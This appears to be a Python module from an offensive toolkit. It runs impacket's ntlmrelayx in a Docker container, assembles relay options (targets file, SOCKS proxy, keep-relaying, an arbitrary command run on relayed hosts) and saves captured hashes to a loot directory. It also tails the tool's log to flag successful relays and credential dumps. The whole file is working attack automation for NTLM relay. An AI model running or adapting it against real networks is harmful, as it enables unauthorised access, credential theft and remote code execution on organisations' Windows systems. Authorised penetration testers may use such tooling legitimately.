"""Controller for impacket ntlmrelayx Docker container."""
from __future__ import annotations

import threading
import time
from pathlib import Path
from typing import Any, Dict, Optional

import docker
from docker.models.containers import Container

from btc_relay_module_nxc_impckt.config import AppConfig, NtlmrelayxConfig
from btc_relay_module_nxc_impckt.logger import get_logger, jsonl_event
from btc_relay_module_nxc_impckt.session import SessionRegistry
from btc_relay_module_nxc_impckt.utils.docker_helpers import (
    ensure_image,
    get_client,
    run_detached,
    stop_container,
)

logger = get_logger()

CONTAINER_NAME = "btc-relay-ntlmrelayx"


class NtlmrelayxController:
    """Manages the lifecycle and log tailing of the ntlmrelayx container."""

    def __init__(self, cfg: AppConfig, registry: SessionRegistry) -> None:
        self.cfg = cfg
        self.ntlm_cfg = cfg.ntlmrelayx
        self.registry = registry
        self.client = get_client()
        self._container: Optional[Container] = None
        self._stop_event = threading.Event()
        self._log_thread: Optional[threading.Thread] = None

    def start(self) -> None:
        if not self.ntlm_cfg.enabled:
            logger.info("ntlmrelayx is disabled in config")
            return

        ensure_image(self.client, self.cfg.docker.impacket_image)
        stop_container(self.client, CONTAINER_NAME)

        volumes = self._build_volumes()
        cmd = self._build_command()

        self._container = run_detached(
            self.client,
            image=self.cfg.docker.impacket_image,
            command=cmd,
            name=CONTAINER_NAME,
            network_mode=self.cfg.docker.network_mode,
            volumes=volumes,
        )
        logger.info(f"ntlmrelayx started: {self._container.short_id}")

        # Start log tailing in background thread
        self._stop_event.clear()
        self._log_thread = threading.Thread(target=self._tail_logs, daemon=True)
        self._log_thread.start()

    def stop(self) -> None:
        self._stop_event.set()
        if self._log_thread:
            self._log_thread.join(timeout=5)
        stop_container(self.client, CONTAINER_NAME)
        self._container = None
        logger.info("ntlmrelayx stopped")

    def is_running(self) -> bool:
        if not self._container:
            return False
        try:
            self._container.reload()
            return self._container.status == "running"
        except Exception:
            return False

    def _build_volumes(self) -> Dict[str, Dict[str, str]]:
        loot = str(Path(self.cfg.docker.loot_dir).resolve())
        logs = str(Path(self.cfg.docker.logs_dir).resolve())
        Path(loot).mkdir(parents=True, exist_ok=True)
        Path(logs).mkdir(parents=True, exist_ok=True)
        return {
            loot: {"bind": "/loot", "mode": "rw"},
            logs: {"bind": "/logs", "mode": "rw"},
        }

    def _build_command(self) -> list[str]:
        """Build shell command for ntlmrelayx inside container."""
        parts = ["impacket.ntlmrelayx"]
        cfg = self.ntlm_cfg

        if cfg.targets_file:
            parts += ["-tf", "/logs/targets.txt"]
        if cfg.interface_ip:
            parts += ["-ip", cfg.interface_ip]
        if cfg.smb2support:
            parts.append("-smb2support")
        if cfg.socks:
            parts.append("-socks")
            parts += ["-socks-port", str(cfg.socks_port)]
        if cfg.keep_relaying:
            parts.append("--keep-relaying")
        if cfg.command:
            parts += ["-c", cfg.command]
        # Redirect stdout to a file so we can tail it from host side
        parts += ["-of", "/loot/hashes", "-l", "/loot"]
        cmd_str = " ".join(parts) + " > /logs/ntlmrelayx.log 2>&1"
        return ["-c", cmd_str]

    def _tail_logs(self) -> None:
        """Tail the mounted log file from host side."""
        log_path = Path(self.cfg.docker.logs_dir) / "ntlmrelayx.log"
        # Wait for file to appear
        for _ in range(30):
            if self._stop_event.is_set():
                return
            if log_path.exists():
                break
            time.sleep(0.5)

        if not log_path.exists():
            logger.warning("ntlmrelayx.log never appeared")
            return

        with log_path.open("r", encoding="utf-8", errors="replace") as fh:
            # Seek to end initially? No, read from start to catch all
            while not self._stop_event.is_set():
                line = fh.readline()
                if not line:
                    time.sleep(0.5)
                    continue
                line = line.rstrip("\n")
                self._parse_line(line)

    def _parse_line(self, line: str) -> None:
        """Stub: parse ntlmrelayx output for relay successes."""
        # Example patterns to extend:
        # "[*] SMBD-Thread-5: Connection from ... authenticated"
        # "[*] Authenticating against ... as ..."
        # "[*] Dumping domain credentials ..."
        if "authenticated" in line.lower() or "relay" in line.lower():
            logger.info(f"[ntlmrelayx] {line}")
            jsonl_event("ntlmrelayx_log", line=line)
        else:
            logger.debug(f"[ntlmrelayx] {line}")
